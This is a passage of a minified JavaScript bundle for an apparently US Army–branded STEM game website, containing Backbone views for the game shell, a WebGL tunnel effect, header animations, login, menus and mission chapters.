var appModel=require("models/app-model"),scoreInterface=require("shared/scoreinterface"),BaseView=require("views/base-view"),namespace=require("shared/namespace"),util=require("shared/utils/util"),storage=require("shared/utils/storage"),client=require("shared/utils/client/client"),analytics=require("shared/analytics"),Intro=require("./game-intro"),Result=require("./game-result"),WebGLTunnel=require("./webgl-tunnel"),GameInstructions=require("shared/game-instructions/game-instructions"),GameShell=BaseView.extend({template:"gameshell-main",className:"gameshell",initialize:function(t){if(console.log("GameShell.initialize",t),void 0===t.difficulty&&console.warn("please pass in difficulty option"),_.extend(this,t),this.model=new Backbone.Model,this.render(),this.setElement(this.$el),this.$el.addClass("game-"+this.data.config.slug),this.buildViews(),this.importGame(),this.bindEvents(),this.showIntro(),("dev"===window.env||null!==window.location.search.match("debug"))&&(window._gameshell=this),null!==window.location.search.match("win-lose")){var e=this,i=$("<button>win</button>").on("click",function(){e.game.trigger("win",{score:{accuracy:Math.random(),skill:Math.random(),speed:Math.random()}})});i.css({position:"absolute",left:"50%",zIndex:200});var n=$("<button>lose</button>").on("click",function(){e.game.trigger("lose",{score:{accuracy:.5*Math.random(),skill:.5*Math.random(),speed:.5*Math.random()}})});n.css({position:"absolute",left:"40%",zIndex:200}),this.$el.append(n),this.$el.append(i)}},exit:function(t){TweenLite.to(this.$el,.3,{opacity:0,onComplete:function(){t()}})},bindEvents:function(){var t=this;this.listenToOnce(this.gameIntro,"continue",function(){this.webglTunnel.exit(),this.gameIntro.exit(function(){t.showGame()})}),this.listenTo(this.game,"win",function(t){var e=this;scoreInterface.send({game_id:this.data.config.slug,skill:t.score.skill,accuracy:t.score.accuracy,speed:t.score.speed,difficulty:this.difficulty,game_data:t.game_data},function(t){e.trigger("win",t),analytics.trackEvent(e.data.config.slug,"win",e.difficulty,t.score)})}),this.listenTo(this.game,"lose",function(e){t.trigger("lose",e),analytics.trackEvent(t.data.config.slug,"lose",t.difficulty)}),this.listenTo(this.result,"next",function(){this.exit(function(){t.trigger("next")})})},buildViews:function(){var t=this.data.config.slug,e=this.data.config.description;void 0!==client.device.type&&this.data.config.description_device&&(e=this.data.config.description_device);var i=parseInt(t[0])+1;6===i&&null!==window.location.hash.match("training-room")&&i--,this.gameIntro=new Intro({$el:this.$(".game-intro"),title:"challenge "+util.padInt(2,i),name:this.data.config.title,slug:t,description:e,buttonLabel:"continue"}),this.result=new Result({data:this.data,$el:this.$(".game-result")}),this.webglTunnel=new WebGLTunnel({$el:this.$(".webgl-tunnel"),$panel:this.$(".panel"),gameIndex:t.charAt(0)})},importGame:function(){var t=namespace.games.webgl[this.data.config.slug],e=["easy","easy","medium","hard"];this.game=new t({difficulty:this.difficulty,appModel:appModel,config:this.data.config,gameData:this.data.versions[e[this.difficulty]],$parent:this.$(".main")}),this.instructions=new GameInstructions({$el:this.$(".game-instructions"),game:this.data.config.slug})},showIntro:function(){storage.getItem("retry")?(storage.removeItem("retry"),this.webglTunnel.exit(),this.showGame()):(this.gameIntro.enter(),this.webglTunnel.enter())},showGame:function(){this.game.load(function(){this.$(".main").css({visibility:"visible"}).addClass("fade-in"),this.game.enter()}.bind(this)),analytics.trackEvent(this.data.config.slug,"start",this.difficulty),this.$(".open-instructions-btn").css({opacity:1,visibility:"visible"}),this.instructionsBlinkInterval=setInterval(function(){this.blinkInstructions()}.bind(this),1e4),setTimeout(function(){this.blinkInstructions()}.bind(this),3e3)},showResult:function(t,e,i){console.log("GameShell.showResult",t,e,i);var n=this;this.$(".main").removeClass("fade-in").addClass("fade-out"),setTimeout(function(){n.game.exit(),n.webglTunnel.enter(),n.result.enter(t,e,i)},500);var s=this.$(".open-instructions-btn");s.css({opacity:0}),setTimeout(function(){s.css("visibility","hidden")},500),clearInterval(this.instructionsBlinkInterval)},blinkInstructions:function(){var t=this.$(".open-instructions-btn").addClass("blink");setTimeout(function(){t.removeClass("blink")},3e3)},events:{"click .open-instructions-btn":"onClickShowInstructions","mouseenter .open-instructions-btn":"onInstructionsMouseEnter","mouseleave .open-instructions-btn":"onInstructionsMouseExit"},onInstructionsMouseEnter:function(){namespace.audioProxy.triggerUI(namespace.audioProxy.UI_EVENTS.INSTRUCTIONS_ROLL_OVER)},onInstructionsMouseExit:function(){namespace.audioProxy.triggerUI(namespace.audioProxy.UI_EVENTS.INSTRUCTIONS_ROLL_OUT)},onClickShowInstructions:function(){this.instructions.enter(),clearInterval(this.instructionsBlinkInterval),namespace.audioProxy.triggerUI(namespace.audioProxy.UI_EVENTS.INSTRUCTIONS_CLICK)}});module.exports=GameShell;
},{"./game-intro":66,"./game-result":67,"./webgl-tunnel":69,"models/app-model":46,"shared/analytics":107,"shared/game-instructions/game-instructions":114,"shared/namespace":140,"shared/scoreinterface":142,"shared/utils/client/client":217,"shared/utils/storage":223,"shared/utils/util":225,"views/base-view":63}],69:[function(require,module,exports){
var Stars=require("./webgl/stars"),Tunnel=require("./webgl/tunnel"),FXHandler=require("./webgl/fx-handler"),client=require("shared/utils/client/client"),WebGLTunnel=function(e){function n(){y.w=window.innerWidth,y.h=window.innerHeight,c.aspect=y.w/y.h,c.updateProjectionMatrix(),s.setSize(y.w,y.h),h.setSize(y.w,y.h),b.trigger("resize")}function t(){window.requestAnimationFrame(t),R||(b.trigger("update"),z+=.1,E.rotation.x+=(-S.y*x-E.rotation.x)/20,E.rotation.y+=(S.x*x-E.rotation.y)/20,m.rotation.copy(E.rotation),c.position.z+=(g-c.position.z)/20,L&&s.render(l,c),h.render(f,c))}function i(){window.addEventListener("resize",n,!1),$("body").on("mousemove",r),$("body").on("touchstart",a),$("body").on("touchmove",d)}function o(){window.removeEventListener("resize",n,!1),$("body").off("mousemove",r),$("body").off("touchstart",a),$("body").off("touchmove",d)}function r(e){S.x=e.clientX/window.innerWidth*2-1,S.y=2*-(e.clientY/window.innerHeight)+1}function a(e){r(e.originalEvent.touches[0])}function d(e){e.preventDefault(),e.stopPropagation(),r(e.originalEvent.touches[0])}function u(){n(),TweenLite.fromTo(v,1,{autoAlpha:0},{autoAlpha:1}),c.position.z=1e3,g=450,R=!1,i()}function w(){g=0,TweenLite.to(v,.6,{autoAlpha:0,onComplete:function(){R=!0}}),o()}var c,l,s,f,h,E,m,g,p,b=this,v=e.$el,T=e.$panel,H=e.gameIndex,S=new THREE.Vector2(0,0),y={},x=Math.PI/12,z=0,R=!0,L="mobile"===client.device.type||"tablet"===client.device.type,W=function(){console.log("WebGLTunnel.init",e),c=new THREE.PerspectiveCamera(75,window.innerWidth/window.innerHeight,1,3e3),l=new THREE.Scene,s=new THREE.WebGLRenderer({preserveDrawingBuffer:-1!==window.location.search.indexOf("screenshot")}),s.setSize(window.innerWidth,window.innerHeight),v.append(s.domElement),E=new THREE.Object3D,l.add(E),l.fog=new THREE.Fog(0,1e3,3e3),f=new THREE.Scene,h=new THREE.CSS3DRenderer,h.setSize(window.innerWidth,window.innerHeight),h.domElement.style.position="absolute",h.domElement.style.top=0;var i=document.createElement("div");m=new THREE.CSS3DObject(i),f.add(m),v.append(h.domElement);var o=new THREE.CSS3DObject(T[0]);m.add(o);var r=.9;o.scale.set(r,r,r);var a=new Stars({webGLMain:b});a.init();var d=new Tunnel({webGLMain:b,gameIndex:H});d.init(),L||(p=new FXHandler({webGLMain:b}),p.init()),n(),t()};_.extend(this,Backbone.Events),_.extend(this,{getMainHolder:function(){return E},getVizTime:function(){return z},getScene:function(){return l},getCamera:function(){return c},getRenderer:function(){return s},getVizSize:function(){return y},enter:u,exit:w}),W()};module.exports=WebGLTunnel;
},{"./webgl/fx-handler":70,"./webgl/stars":71,"./webgl/tunnel":72,"shared/utils/client/client":217}],70:[function(require,module,exports){
require("shared/lib/three.js-master/examples/js/postprocessing/EffectComposer.js"),require("shared/lib/three.js-master/examples/js/postprocessing/RenderPass.js"),require("shared/lib/three.js-master/examples/js/postprocessing/ShaderPass.js"),require("shared/lib/three.js-master/examples/js/postprocessing/MaskPass.js"),require("shared/lib/three.js-master/examples/js/shaders/CopyShader.js"),require("shared/lib/three.js-master/examples/js/shaders/VignetteShader.js"),require("shared/lib/three.js-master/examples/js/shaders/VerticalTiltShiftShader.js");var LinesShader=require("shared/shaders//LinesShader.js"),BarrelBlurShader=require("shared/shaders/BarrelBlurShader.js"),LinesShader=require("shared/shaders/LinesShader.js"),GlowShader=require("shared/shaders/GlowShader.js"),FXHandler=function(e){function s(){t.on("update",r),t.on("resize",a),n=new THREE.EffectComposer(t.getRenderer()),d=new THREE.RenderPass(t.getScene(),t.getCamera()),l=new THREE.ShaderPass(THREE.CopyShader),i={},i.lines=new THREE.ShaderPass(LinesShader),i.glow=new THREE.ShaderPass(GlowShader),i.vignette=new THREE.ShaderPass(THREE.VignetteShader),i.barrelBlur=new THREE.ShaderPass(BarrelBlurShader),i.lines.uniforms.lineSize.value=1840,i.lines.uniforms.lineStrength.value=.1,i.lines.uniforms.lineTilt.value=.85,i.glow.uniforms.amount.value=.4,i.glow.uniforms.size.value=3.7,i.glow.uniforms.darkness.value=.14,i.vignette.uniforms.offset.value=.9,i.barrelBlur.uniforms.amount.value=.01,n=new THREE.EffectComposer(t.getRenderer()),n.addPass(d),n.addPass(i.lines),n.addPass(i.glow),n.addPass(i.vignette),n.addPass(i.barrelBlur),n.addPass(l),l.renderToScreen=!0}function r(){n.render(.1),h+=.1,i.barrelBlur.uniforms.time.value=h}function a(){n&&n.setSize(t.getVizSize().w,t.getVizSize().h)}var i,n,d,l,t=e.webGLMain,h=0;return{init:s,update:r,onResize:a}};module.exports=FXHandler;
},{"shared/lib/three.js-master/examples/js/postprocessing/EffectComposer.js":130,"shared/lib/three.js-master/examples/js/postprocessing/MaskPass.js":131,"shared/lib/three.js-master/examples/js/postprocessing/RenderPass.js":132,"shared/lib/three.js-master/examples/js/postprocessing/ShaderPass.js":133,"shared/lib/three.js-master/examples/js/shaders/CopyShader.js":135,"shared/lib/three.js-master/examples/js/shaders/VerticalTiltShiftShader.js":136,"shared/lib/three.js-master/examples/js/shaders/VignetteShader.js":137,"shared/shaders//LinesShader.js":148,"shared/shaders/BarrelBlurShader.js":143,"shared/shaders/GlowShader.js":147,"shared/shaders/LinesShader.js":148}],71:[function(require,module,exports){
var ATUtil=require("shared/utils/general-utils"),Stars=function(e){function t(){d.on("update",i),n=new THREE.Object3D,d.getMainHolder().add(n),r=new THREE.Geometry;var e=THREE.ImageUtils.loadTexture("assets/imgs/site-webgl/dot.png");a=new THREE.PointCloudMaterial({size:15,map:e,blending:THREE.AdditiveBlending,depthTest:!1,transparent:!0,opacity:1}),a.particleHue=Math.random(),a.color=new THREE.Color(16777215),a.color.setHSL(a.particleHue,1,1);for(var t=1e3,l=0;s>l;l++){var u=new THREE.Vector3(ATUtil.randomRange(-t,t),ATUtil.randomRange(-t,t),ATUtil.randomRange(-t,t));r.vertices.push(u),u.initPos=Math.random()}o=new THREE.PointCloud(r,a),o.position.z=-500,o.sortParticles=!1,n.add(o)}function i(){for(var e=0;s>e;e++){var t=(r.vertices[e].initPos+.006*d.getVizTime())%1*3e3-1e3;r.vertices[e].z=t}r.verticesNeedUpdate=!0}var r,a,n,o,s=300,d=e.webGLMain;return{init:t,update:i}};module.exports=Stars;
},{"shared/utils/general-utils":220}],72:[function(require,module,exports){
var ATUtil=require("shared/utils/general-utils");require("shared/utils/CustomCylinderGeometry");var Tunnel=function(e){function t(){w.rotSpeed=ATUtil.lerp(v,0,.06),w.speed=ATUtil.lerp(v,.1,.2),w.displacement=ATUtil.lerp(v,0,30),w.radiusSegments=R+3,w.subdivisions=Math.max(5-R,3),w.tunnelRadius=ATUtil.lerp(v,600,330),g.on("update",o),r=new THREE.Object3D,g.getMainHolder().add(r),T=new THREE.Object3D,r.add(T),T.rotation.x=-Math.PI/2,c=new THREE.Object3D,T.add(c),E=new THREE.Object3D,T.add(E),E.position.y=H,p=new THREE.CylinderGeometry(w.tunnelRadius,w.tunnelRadius,H,w.radiusSegments,h,!0,0,2*Math.PI,w.subdivisions),u=p.clone(),i(p,16711680),i(u,65280),n(p),n(u),d=new THREE.MeshBasicMaterial({depthTest:!1,blending:THREE.AdditiveBlending,transparent:!0,wireframe:!0,wireframeLinewidth:1.5,vertexColors:THREE.VertexColors}),s=new THREE.Mesh(p,d),l=new THREE.Mesh(u,d),c.add(s),E.add(l);var e=THREE.ImageUtils.loadTexture("assets/imgs/site-webgl/dot.png");m=new THREE.PointCloudMaterial({size:10,map:e,blending:THREE.AdditiveBlending,depthTest:!1,transparent:!0,opacity:1,color:16777215});var t=p.clone(),y=new THREE.PointCloud(t,m);y.sortParticles=!1,c.add(y);var f=u.clone(),M=new THREE.PointCloud(f,m);M.sortParticles=!1,E.add(M),a()}function i(e){for(var t=0;t<e.faces.length;t++)for(var i=e.faces[t],n=0;3>n;n++){var a=new THREE.Color(3355443);Math.random()<.1&&a.setHex(16777215),Math.random()<.01&&a.setHex(16753920),i.vertexColors[n]=a}e.colorsNeedUpdate=!0}function n(e){for(var t=e.vertices.length,i=w.displacement,n=0;t>n;n++){var a=e.vertices[n];Math.random()<.8||(a.x+=ATUtil.randomRange(-i,i),a.y+=ATUtil.randomRange(-i,i),a.z+=ATUtil.randomRange(-i,i))}e.verticesNeedUpdate=!0}function a(){d.opacity=w.lineOpacity,m.opacity=w.dotOpacity,m.size=w.dotSize}function o(){T.rotation.y+=w.rotSpeed/100,T.position.z+=w.speed/100*H,T.position.z>H&&(y=!y,c.position.y=y?0:H,E.position.y=y?H:0,T.position.z=0)}var r,d,s,l,p,u,c,E,T,m,g=e.webGLMain,R=Number(e.gameIndex),v=R/6,h=30,H=4e3,w={on:!0,lineOpacity:.3,speed:.1,rotSpeed:.02,dotOpacity:.8,dotSize:10,radiusSegments:3,subdivisions:5,tunnelRadius:600,displacement:0,lightBrightness:.5,lightPos:-600,lightSize:1e3},y=!0;return{init:t,update:o}};module.exports=Tunnel;
},{"shared/utils/CustomCylinderGeometry":214,"shared/utils/general-utils":220}],73:[function(require,module,exports){
var router=require("router"),BaseView=require("views/base-view"),appModel=require("models/app-model"),ns=require("shared/namespace"),HeaderView=BaseView.extend({template:"header",initialize:function(e){_.extend(this,e),this.render(),this.bindEvents(),this.setupAnimations()},onRoute:function(){console.log("HeaderView.onRoute",arguments);var e=this.$(".main-menu");null!==window.location.hash.match("main-menu")?(e.removeClass("fade-in").addClass("fade-out"),setTimeout(function(){e.css("visibility","hidden")},500)):(e.removeClass("fade-out").addClass("fade-in"),e.css("visibility","visible"))},bindEvents:function(){this.listenTo(appModel,appModel.events.SECTION.CHANGE,this.onRoute),this.$(".btn.main-menu").on("click",this.handleMenuClick.bind(this)),this.$(".btn.stemLogo").on("click",this.handleHomeClick.bind(this))},handleMenuClick:function(){var e={section:"main-menu"},a=window.location.hash;(/mission\/[0-9]/.test(a)||/training-room\/[0-9]/.test(a)||/recon/.test(a))&&(e.type="hard"),router.navigate("!/main-menu",{trigger:!1}),appModel.trigger(appModel.events.SECTION.CHANGE,e),ns.audioProxy.triggerUI(ns.audioProxy.UI_EVENTS.MAIN_MENU_CLICK)},handleHomeClick:function(){var e={section:""},a=window.location.hash;(/mission\/[0-9]/.test(a)||/training-room\/[0-9]/.test(a)||/recon/.test(a))&&(e.type="hard"),router.navigate("!/#",{trigger:!1}),appModel.trigger(appModel.events.SECTION.CHANGE,e)},enter:function(){var e=2400;setTimeout(function(){this.america(),this.showSTEM()}.bind(this),e)},exit:function(e){this.$("header").addClass("fade-out"),setTimeout(function(){e&&"function"==typeof e&&e()},500)},setupAnimations:function(){function e(){for(var e=0;x>e;e++){var a=e/10+.1;TweenMax.set(p[e],{delay:a-.05,opacity:.2}),TweenMax.to(p[e],.3,{delay:a,opacity:.8,ease:RoughEase.ease.config({strength:5.1,points:55})})}TweenMax.to(p[0],.5,{y:-4,x:0,ease:Power4.easeOut}),TweenMax.to(p[1],.5,{delay:.01,x:4,ease:Power4.easeOut}),TweenMax.to(p[2],.5,{delay:.02,x:2,y:2,ease:Power4.easeOut}),TweenMax.to(p[3],.5,{delay:.03,x:-2,y:2,ease:Power4.easeOut}),TweenMax.to(p[4],.5,{delay:.04,x:-4,ease:Power4.easeOut}),TweenMax.to(T,.5,{opacity:.3,ease:RoughEase.ease.config({strength:5.1,points:55})}),TweenMax.to(f,.5,{opacity:.3,ease:RoughEase.ease.config({strength:5.1,points:55})}),TweenMax.to(w,1,{x:45,opacity:0,ease:Power4.easeOut}),TweenMax.to(l,1,{width:"100%",opacity:.3,ease:Power4.easeOut});for(var e=0;m>e;e++){var a=e/100+.001;TweenMax.to(M[e],.4,{delay:a,opacity:.8,ease:RoughEase.ease.config({strength:5.1,points:55})})}ns.audioProxy.triggerUI(ns.audioProxy.UI_EVENTS.STEM_LOGO_ROLL_OVER)}function a(){for(var e=0;x>e;e++){var a=e/100+.01;TweenMax.to(p[e],.5,{delay:a,y:0,x:0,ease:Power4.easeOut})}TweenMax.to(T,.1,{opacity:0,ease:RoughEase.ease.config({strength:5.1,points:55})}),TweenMax.to(f,.1,{opacity:0,ease:RoughEase.ease.config({strength:5.1,points:55})}),TweenMax.to(w,.8,{delay:.03,x:0,opacity:1,ease:Power4.easeOut}),TweenMax.to(l,1,{delay:.03,width:"26%",opacity:.3,ease:Power4.easeOut});for(var t=0,e=3;e>=0;e--)t+=.01,TweenMax.to(M[e],.2,{delay:t,opacity:0,ease:RoughEase.ease.config({strength:5.1,points:55})});ns.audioProxy.triggerUI(ns.audioProxy.UI_EVENTS.STEM_LOGO_ROLL_OUT)}var t=$(".stemLogo"),o=$(".stemLock li"),n=o.length,s=$(".usArmyType li"),i=s.length,r=$(".usArmyBar1"),u=$(".usArmyBar2"),c=$(".usArmyBar3");t.mouseenter(function(){d()}),t.mouseleave(function(){h()}),this.showSTEM=function(){for(var e=.5,a=e+.1,t=0;n>t;t++){var u=t/10+e;TweenMax.to(o[t],.3,{delay:u,opacity:.5,ease:RoughEase.ease.config({strength:5.1,points:55})})}for(var c=0;i>c;c++){var d=c/10+a;TweenMax.to(s[c],.3,{delay:d,opacity:.5,ease:RoughEase.ease.config({strength:5.1,points:55})})}TweenMax.to(r,1.5,{delay:.6,x:0,opacity:.2,width:"100%",ease:Power4.easeOut})};var d=this.mouseEnterSTEM=function(){for(var e=0;n>e;e++){var a=e/10+.1;TweenMax.set(o[e],{delay:a-.05,opacity:.2}),TweenMax.to(o[e],.2,{delay:a,opacity:1,ease:RoughEase.ease.config({strength:5.1,points:55})})}for(var t=0;i>t;t++){var r=t/10+.001;TweenMax.to(s[t],.2,{delay:r,opacity:1,color:"#000",ease:RoughEase.ease.config({strength:115.1,points:55})})}TweenMax.to(u,.8,{opacity:1,width:"100%",ease:Power4.easeOut}),ns.audioProxy.triggerUI(ns.audioProxy.UI_EVENTS.STEM_LOGO_ROLL_OVER)},h=this.mouseLeaveSTEM=function(){for(var e=0;n>e;e++){var a=e/10+.1;TweenMax.to(o[e],.2,{delay:a,opacity:.5,ease:RoughEase.ease.config({strength:5.1,points:55})})}for(var t=0;i>t;t++){var r=t/10+.001;TweenMax.to(s[t],.2,{delay:r,opacity:.5,color:"#fff",ease:RoughEase.ease.config({strength:11,points:55})})}TweenMax.set(u,{opacity:0,width:0}),TweenMax.set(c,{opacity:1,width:"100%"}),TweenMax.to(c,.7,{delay:.2,opacity:0,width:0,ease:Power4.easeOut}),ns.audioProxy.triggerUI(ns.audioProxy.UI_EVENTS.STEM_LOGO_ROLL_OUT)},y=$(".menuUI"),w=$(".menuLines"),g=$(".menuLine1"),l=$(".menuLine2"),p=$(".starz"),x=p.length,T=$(".menuWire1"),f=$(".menuWire2"),M=$(".menuTxt li"),m=M.length;this.america=function(){for(var e=0;x>e;e++){var a=e/10+.1;TweenMax.to(p[e],.3,{delay:a,opacity:.8,ease:RoughEase.ease.config({strength:5.1,points:55})}),TweenMax.to(p[e],.8,{delay:a,y:0,x:0,ease:Power4.easeOut})}TweenMax.to(w,.9,{x:0,ease:Power4.easeOut}),TweenMax.to(g,.5,{width:"100%",opacity:.3,ease:Power4.easeOut}),TweenMax.to(l,.5,{delay:.1,width:"26%",opacity:.3,ease:Power4.easeOut})},this.menuStarzLoop=function(){for(var e=0;x>e;e++){var a=e/10+.1;TweenMax.set(p[e],{delay:a-.05,opacity:.2}),TweenMax.to(p[e],.3,{delay:a,opacity:.8,ease:RoughEase.ease.config({strength:5.1,points:55})})}},y.mouseenter(function(){e()}),y.mouseleave(function(){a()})}});module.exports=HeaderView;
},{"models/app-model":46,"router":47,"shared/namespace":140,"views/base-view":63}],74:[function(require,module,exports){
var BaseView=require("views/base-view"),appModel=require("models/app-model"),client=require("shared/utils/client/client"),ns=require("shared/namespace"),HomeMain=BaseView.extend({template:"home",className:"section home fullframe",initialize:function(e){_.extend(this,e),this.render({client:client}),1===this.$(".item-holder").length&&this.$(".item-holder").addClass("center"),_.bindAll(this,"handleMenuClick")},enter:function(e){console.log("HomeMain.enter"),this.$(".item").off("click",this.handleMenuClick),this.$(".item").on("click",this.handleMenuClick),this.$(".item").on("mouseenter",this.handleMouseOver),this.$(".item").on("mouseleave",this.handleMouseOut),TweenMax.staggerFromTo(this.$(".item-holder, .triangle-wand"),1,{opacity:0},{opacity:1,onComplete:function(){e()},ease:new window.RoughEase({strength:2,points:40,template:window.Strong.easeInOut}),delay:4},.3),ns.audioProxy.triggerEvent("landingpage_start")},exit:function(e){e(),ns.audioProxy.triggerEvent("landingpage_stop")},handleMenuClick:function(e){var i=$(e.currentTarget).attr("rel"),n={section:i};appModel.trigger(appModel.events.SECTION.CHANGE,n),ns.audioProxy.triggerEvent("main_click")},handleMouseOver:function(){ns.audioProxy.triggerEvent("main_rollover")},handleMouseOut:function(){}});module.exports=HomeMain;
},{"models/app-model":46,"shared/namespace":140,"shared/utils/client/client":217,"views/base-view":63}],75:[function(require,module,exports){
var BaseView=require("views/base-view"),user=require("shared/user"),appModel=require("models/app-model"),analytics=require("shared/analytics"),ns=require("shared/namespace"),storage=require("shared/utils/storage"),Login=BaseView.extend({template:"login",id:"login",initialize:function(){this.render()},enter:function(e){ns.audioProxy.triggerEvent("login_start"),this.setElement(this.$el),this.$el.css({display:"block",opacity:0}),TweenLite.to(this.$el,.5,{opacity:1,onComplete:function(){e()}})},exit:function(e){ns.audioProxy.triggerEvent("login_stop"),TweenLite.to(this.$el,.3,{opacity:0,onComplete:function(){e()}})},events:{"mouseenter .popup":"onHoverLogin","mouseleave .popup":"onMouseoutLogin","click .popup":"onClickLogin","click .cancel":"onClickCancel","mouseenter .cancel":"onHoverCancel"},onHoverCancel:function(){ns.audioProxy.triggerUI(ns.audioProxy.UI_EVENTS.LOGIN_CANCEL_ROLL_OVER)},onHoverLogin:function(){ns.audioProxy.triggerUI(ns.audioProxy.UI_EVENTS.LOGIN_LOGIN_ROLL_OVER)},onMouseoutLogin:function(){ns.audioProxy.triggerEvent("main_rollout")},onClickCancel:function(){appModel.trigger(appModel.events.SECTION.CHANGE,{section:"main-menu"}),ns.audioProxy.triggerUI(ns.audioProxy.UI_EVENTS.LOGIN_CANCEL_CLICK)},onClickLogin:function(e){var o=$(e.currentTarget).attr("data-id");user.login(o,function(e){if(console.log("login-main.onClickLogin",e),e.logged_in){var o="profile";"true"===storage.getItem("saving")&&(storage.removeItem("saving"),o="mission"),appModel.trigger(appModel.events.SECTION.CHANGE,{section:o})}}),analytics.trackEvent("click","login",o),ns.audioProxy.triggerUI(ns.audioProxy.UI_EVENTS.LOGIN_LOGIN_CLICK)}});module.exports=Login;
},{"models/app-model":46,"shared/analytics":107,"shared/namespace":140,"shared/user":213,"shared/utils/storage":223,"views/base-view":63}],76:[function(require,module,exports){
var BaseView=require("views/base-view"),appModel=require("models/app-model"),client=require("shared/utils/client/client"),user=require("shared/user"),ns=require("shared/namespace"),MainMenu=BaseView.extend({template:"main-menu",className:"section main-menu fullframe",initialize:function(e){_.extend(this,e),this._render(),this.bindEvents()},_render:function(){this.render({client:client,user:user.attributes})},enter:function(e){this.setElement(this.$el),this.$el.removeClass("fade-out"),TweenMax.staggerFromTo(this.$(".item"),1,{opacity:0},{opacity:1,onComplete:function(){e()},ease:new RoughEase({strength:2,points:40,template:window.Strong.easeInOut}),delay:.2},.12),ns.audioProxy.triggerEvent("dashboard_start")},exit:function(e){this.$el.removeClass("fade-in").addClass("fade-out"),setTimeout(function(){e()},300)},bindEvents:function(){user.on("change:logged_in",this.onChangeLoginStatus.bind(this))},onChangeLoginStatus:function(){this._render()},events:{"click .item":"handleMenuClick","mouseenter .item":"handleMouseOver"},handleMenuClick:function(e){ns.audioProxy.triggerEvent("main_click"),ns.audioProxy.triggerEvent("dashboard_stop");var n=$(e.currentTarget).attr("rel");if("logout"===n)return void user.logout(function(){window.location.reload()});var t={section:n};appModel.trigger(appModel.events.SECTION.CHANGE,t)},handleMouseOver:function(){ns.audioProxy.triggerUI(ns.audioProxy.UI_EVENTS.MAIN_MENU_ROLL_OVER)}});module.exports=MainMenu;
},{"models/app-model":46,"shared/namespace":140,"shared/user":213,"shared/utils/client/client":217,"views/base-view":63}],77:[function(require,module,exports){
var dataInterface=require("shared/datainterface"),BaseView=require("views/base-view"),GameShell=require("views/gameshell/gameshell-main"),Story=require("./story"),appModel=require("models/app-model"),router=require("router"),user=require("shared/user"),ns=require("shared/namespace"),storage=require("shared/utils/storage"),ChapterMain=BaseView.extend({template:"mission-chapter",className:"chapter",initialize:function(e){console.log("ChapterMain.initialize",e),_.extend(this,e),this.render(),storage.getItem("retry")?this.onStoryComplete():(this.story=new Story({video:this.data.story_video,title_card:this.data.story_title_card,$el:this.$(".story")}),this.listenToOnce(this.story,"complete",this.onStoryComplete))},onStoryComplete:function(){dataInterface.getGame(this.data.game.slug,this.receiveData.bind(this))},receiveData:function(e){console.log("ChapterMain.receiveData",e);var t=this;this.$(".story").hide(),this.$(".gameshell").addClass("_"+this.data.game.slug),this.gameshell=new GameShell({data:e,$el:this.$(".gameshell"),difficulty:this.difficulty}),this.listenTo(this.gameshell,"win",function(e){t.saveGameState(e,!0)}),this.listenTo(this.gameshell,"lose",function(e){t.saveGameState(e,!1)}),this.listenTo(this.gameshell,"next",function(){var e=parseInt(t.data.game.slug[0])+1;7===e?router.navigate("!/profile"):(storage.setItem("next_level_index",e),router.navigate("!/mission")),appModel.trigger(appModel.events.HARD_ROUTE)})},saveGameState:function(e,t){console.log("ChapterMain.saveGameState",e);var a=this.data.game.slug,s=_.keys(ns.games.webgl||ns.games.standard),i=!1;if(t){var r=s.indexOf(a);a=s[r+1],void 0===a&&(a="done",i=!0),console.log("saving mission status...",a),user.setMissionState({game:a,difficulty:3})}else{var l=this.difficulty-1;0===l&&(a="done",l=3,i=!0),user.setMissionState({game:a,difficulty:l})}this.gameshell.showResult(t,e,i)}});module.exports=ChapterMain;
},{"./story":78,"models/app-model":46,"router":47,"shared/datainterface":111,"shared/namespace":140,"shared/user":213,"shared/utils/storage":223,"views/base-view":63,"views/gameshell/gameshell-main":68}],78:[function(require,module,exports){
var BaseView=require("views/base-view"),ScoreMeter=require("views/score-meter"),appModel=require("models/app-model"),Story=BaseView.extend({template:"mission-story",initialize:function(i){console.log("Story",i),_.extend(this,i),this.render(i),this.setElement(this.el);var e=new ScoreMeter({$parent:this.$(".play-btn"),max:100,value:75});this.$(".play-btn").css({opacity:1}),e.show(2),this.$("video").on("play",this.onVideoPlay.bind(this)),this.$("video").on("ended",this.onClickSkip.bind(this)),this.listenTo(appModel,"change:muted",function(){this.onChangeMuted()}),this.onChangeMuted(0)},onChangeMuted:function(i){var e=void 0!==i?i:.5,t=appModel.get("muted")?0:1;TweenLite.to(this.$("video"),e,{volume:t})},onVideoPlay:function(){this.$("video").css({opacity:1,visibility:"visible"}),this.$(".play-btn").css({opacity:0,visibility:"hidden"})},events:{"click video":"onClickSkip","click .play-btn":"onClickPlay"},onClickPlay:function(){this.$("video")[0].play()},onClickSkip:function(){this.exit(function(){this.trigger("complete")}.bind(this))},exit:function(i){this.$("video")[0].pause(),TweenLite.to(this.$el,.3,{autoAlpha:0,onComplete:function(){i()}})}});module.exports=Story;
},{"models/app-model":46,"views/base-view":63,"views/score-meter":83}],79:[function(require,module,exports){
var router=require("router"),BaseView=require("views/base-view"),appModel=require("models/app-model"),user=require("shared/user"),storage=require("shared/utils/storage"),client=require("shared/utils/client/client"),ns=require("shared/namespace"),webGLMain=require("views/webgl/webgl-main"),flickerTransition=require("shared/flickertransition"),Chapter=require("./chapter/chapter-main"),MissionMain=BaseView.extend({template:"mission-main",className:"section mission",initialize:function(e){var i=parseInt(user.getMissionState().game[0]);this.render({enabledMax:i,mission:appModel.get("app-data").mission}),this.bindEvents()},enter:function(e){console.log("\nMissionMain.enter"),client.features.localstorage===!1&&window.alert("Local storage is disabled on this browser. You will not be able to progress through the mission until you log in.");var i=window.location.hash.split("/").slice(1),t=2===i.length,n=appModel.get("app-data").mission;if(t){var s=parseInt(i[1])-1,r=parseInt(user.getMissionState().game[0]),o="dev"===window.env||"stage"===window.env||null!==window.location.search.match("debug"),a=-1!==window.location.search.indexOf("teleport")&&o;s>r&&!a?(router.navigate("!/mission"),appModel.trigger(appModel.events.HARD_ROUTE)):this.goToChapter(n.chapters[s])}else this.goToMenu(),ns.audioProxy.triggerEvent("mission_start");e()},exit:function(e){"chapter"===this.state?flickerTransition("out",function(){e()}):(this.$el.css({display:"none"}),e()),ns.audioProxy.triggerEvent("trainingroom_stop")},bindEvents:function(){this.$menuTiles=this.$(".menu-item-tile"),this.$menuTiles.on("click",this.handleMenuClick.bind(this)),this.$menuTiles.on("mouseenter",this.handleMouseOver.bind(this))},handleMenuClick:function(e){console.log($(e.currentTarget).attr("rel")),ns.audioProxy.triggerEvent("main_click");var 